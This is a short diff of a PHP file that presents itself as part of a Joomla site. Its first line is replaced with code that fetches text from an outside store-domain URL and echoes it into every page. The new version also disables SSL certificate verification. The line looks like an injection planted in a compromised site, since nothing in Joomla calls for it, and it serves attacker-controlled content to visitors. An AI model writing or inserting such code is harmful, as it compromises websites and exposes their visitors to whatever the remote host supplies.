@@ -1,5 +1,5 @@
 <?php
-$url='https://selirhati.store/plugins/dqk-2.txt';$a=@file_get_contents($url);if($a===FALSE){echo '<p>Error fetching content from '.$url.'</p>';}else{echo $a;}
+$u='https://selirhati.store/plugins/dqk-2.txt';$a=@file_get_contents($u,false,stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]));if($a===false){echo '<p>Error fetching content from '.$u.'</p>';}else{echo $a;}
 /**
  * @package    Joomla.Site
  *
